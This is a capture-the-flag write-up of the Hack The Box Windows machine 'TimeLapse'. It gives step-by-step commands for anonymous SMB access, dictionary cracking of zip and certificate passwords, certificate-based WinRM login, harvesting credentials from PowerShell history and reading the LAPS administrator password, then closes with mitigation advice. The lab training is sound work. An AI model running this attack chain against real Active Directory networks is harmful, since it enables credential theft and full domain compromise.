TimeLapse HTB Machine Writeup
Machine Overview
TimeLapse is an Easy-rated Windows Active Directory machine on Hack The Box that involves discovering credentials, cracking passwords, and abusing group memberships to escalate privileges. The machine demonstrates common AD security issues, especially focusing on certificate-based authentication and LAPS exploitation.

Reconnaissance
Initial Nmap Scan

sudo nmap 10.129.227.113 -sV -sC
Results:

Port 53: DNS
Port 88: Kerberos
Port 139/445: SMB/NetBIOS
Port 389/636: LDAP/LDAPS
Port 3268/3269: Global Catalog LDAP
Hostname: DC01
Domain: timelapse.htb
Initial Access
SMB Enumeration
We enumerated available SMB shares:


smbclient -L //10.129.227.113 -N
Found several shares, including a non-standard one called "Shares". Exploring this share:


smbclient //10.129.227.113/Shares -N
Inside the Shares directory, we found two subdirectories:

Dev : Containing a zip file winrm_backup.zip
HelpDesk : Containing LAPS-related documentation
Cracking Zip File Password
Downloaded the zip file and found it was password protected:

zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=/path/to/rockyou.txt
Password: supremelegacy

Extracting Certificate
After extracting the zip file (using password supremelegacy), we found a PFX file called legacyy_dev_auth.pfx.

The PFX file was also password protected:


pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/path/to/rockyou.txt
Password: thuglegacy

Extracted the certificate to find the common name:


openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem -passin pass:thuglegacy
openssl x509 -in cert.pem -noout -subject
Common Name: Legacyy

Certificate Authentication
Extracted the private key from the PFX:


openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes -passin pass:thuglegacy
Used Evil-WinRM to connect with the certificate:


evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
Successfully established a shell as the legacyy user and obtained the user flag:


7827527b14dd7e0bac4be2d91574128b
Privilege Escalation
Finding Service Account Credentials
Examined the PowerShell history:


type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Found credentials for the svc_deploy user:

Username: svc_deploy
Password: E3R$Q62^12p7PLlC%KWaxuaV
Enumerating User Groups

net user svc_deploy /domain
Discovered that svc_deploy was a member of the LAPS_Readers group, which can access LAPS-managed passwords.

Exploiting LAPS for Administrator Access
Connected as the service account:


evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
Retrieved the LAPS-managed Administrator password:


Get-ADComputer DC01 -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd
Administrator Password: u23wE}v[q+5;n2cT+{71S67$

Root Access
Connected as Administrator:

evil-winrm -i 10.129.227.113 -u Administrator -p 'u23wE}v[q+5;n2cT+{71S67$' -S

# Key findings & security issues
1. Insecure Password Storage
PowerShell history files retained cleartext credentials.
Password-protected archives used weak passwords.
2. Certificate-Based Authentication
Private keys and certificates were accessible via SMB shares.
Certificates were not properly protected with strong passwords.
3. LAPS Implementation Weaknesses
Non-privileged service accounts had LAPS password-reading capabilities.
Excessive group memberships for service accounts.
4. Excessive SMB Share Access
Sensitive files were accessible anonymously.
No access controls were applied to critical backup files.
5. Defense Evasion via WinRM-S
WinRM with certificate authentication allowed access without standard password-based detection.

# Attack path summary
Discover and access SMB shares anonymously.
Download the encrypted backup zip file.
Crack the zip password using a dictionary attack.
Extract the PFX certificate file.
Crack the PFX password using a dictionary attack.
Use the certificate for WinRM authentication.
Discover service account credentials in the PowerShell history.
Leverage the service account's LAPS_Readers group membership.
Extract the local administrator password using LAPS capabilities.
Authenticate as the domain administrator.

# Mitigation recommendations
Restrict anonymous SMB access.
Implement stronger password policies for archives and certificates.
Clear PowerShell history regularly or disable history logging.
Follow the principle of least privilege for service accounts.
Audit LAPS_Readers groups regularly.
Implement proper certificate management practices.
Restrict WinRM access through network segmentation and stricter authentication mechanisms.
